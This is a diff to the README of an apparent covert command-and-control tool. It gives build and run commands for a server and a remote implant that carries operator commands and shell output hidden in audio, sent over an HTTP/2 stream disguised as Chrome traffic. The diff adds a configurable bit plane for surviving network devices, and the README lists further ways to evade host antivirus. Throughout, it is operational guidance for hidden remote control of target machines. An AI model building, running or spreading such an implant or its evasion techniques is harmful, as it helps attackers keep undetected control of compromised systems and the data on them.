@@ -15,9 +15,10 @@ openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -d
 GOOS=linux GOARCH=amd64 go build -o server server.go data_transform_helper.go
 GOOS=linux GOARCH=amd64 go build -o client client.go data_transform_helper.go
 
-./server -debug off
-#transfer the client to target
-./client -target <IP> [-peet true]
+./server -debug off [-ebit 4 ]
+#transfer the client and sample.wav to target, or use the upcoming mic branch
+./client -target <IP> [-ebit 4] [-peet true]
+#make sure you use matching values of -ebit, 0-7, default 0
 ```
 ---
 ## Overview
@@ -27,7 +28,8 @@ The payload is the operator commands outbound, and shell output inbout to c2. Th
 - TLS fingerprint identical to Chrome (uTLS `HelloChrome_Auto`)
 - HTTP/2 SETTINGS, WINDOW_UPDATE, PRIORITY, and header order match chrome exactly via [http2chrmoe](https://ajithor.github.com/http2chrome).
 - Single persistent bidirectional HTTP/2 stream, which means no polling, no discrete requests after initial connection.
-- AES-GCM encrypted payload before LSB encoding
+- AES-GCM encrypted payload before bit encoding
+- configurable bit plane, to increase survical chances on agressive network modification, at the cost of audio distortion.
 - Authentic Chrome request and response headers on both sides
 - Beaconing with jitterd reconnection on command or data silence.
 - Cross-platform implant (Go, compiles for Linux/Windows/macOS)
@@ -46,11 +48,14 @@ Both sides stream LSB-encoded audio continuously over one HTTP/2 request. The op
 
 ---
 ## AES-GCM + Steganography engine
+### Bit Plane configuration
+The bit used for encoding is configurable at runtime, with the `-ebit` option. Default is bit 0 (LSB). Higher bit plane survives more agressive modifications by network devices like proxies, at the cost of increased audio distortions.
+
 ### Command/output Encoding
-command string --> AES-GCM encrypt --> "STRT"+command+"STOP" --> convert each char into 8 bits. -->For each bit b, for each audio byte s: s= (s &0xFE)|b (overwrite LSB) -->Modified audio bytes streamed over HTTP/2
+command string --> AES-GCM encrypt --> "STRT"+command+"STOP" --> convert each char into 8 bits. -->For each bit b, for each audio byte s: s= (s & andVal)| (b | orVal) (overwrite any Bit) -->Modified audio bytes streamed over HTTP/2
 
 ### Output/command Decoding
-Incoming audio bytes --> check for first 4 bytes of each chunk for "STRT". If it doesnt exist, move on to next chunk. If it exists -> extract LSB of each byte -> append to bit buffer --> every 8 bits assembled to byte -> cast to char till you see "STOP"--> AES-GMC decrypt.
+Incoming audio bytes --> check for first 4 bytes of each chunk for "STRT". If it doesnt exist, move on to next chunk. If it exists -> extract target Bit of each byte -> append to bit buffer --> every 8 bits assembled to byte -> cast to char till you see "STOP"--> AES-GMC decrypt.
 
 ### Encryption specifics
 - key - 16, 24 or 32 bytes (AES-128/192/256) (code has hardcoded 16-byte key)
@@ -142,8 +147,13 @@ rule-matching layer.
 AES-GCM key is currently hardcoded at compile time. Binary capture exposes the key. Something like X25519 + HKDF key exchange would eliminate this without modification to the LSB engin.
 
 ### Host layer evasion
-c2call addresses network-layer detection only. The Go binary itself is detectable by host-based AV. None of these are in the scope of this project - static string analysis (could use garble to compile the code for this)
+c2call addresses network-layer detection only. The Go binary itself is detectable by host-based AV. None of these are in the scope of this project.
+- static string analysis (could use garble to compile the code for this)
 - runtime signatures (custom Go runtime would address this)
 - import table analysis (direct syscalls would adress this)
 - Behavioural detection (something that is dealt by process injection)
 - Memory scanning (in-memory execution could evade this to a certain point)
+
+### Bit plane vs network modification
+LSB encoding does not survive lossy network modification (WAN optimizers, audio transcoders). Use bit 3+ in environments where byte-level modification is suspected.
+Bits 6-7 introduce audible distortion and should be avoided unless lower planes are confirmed unusable.
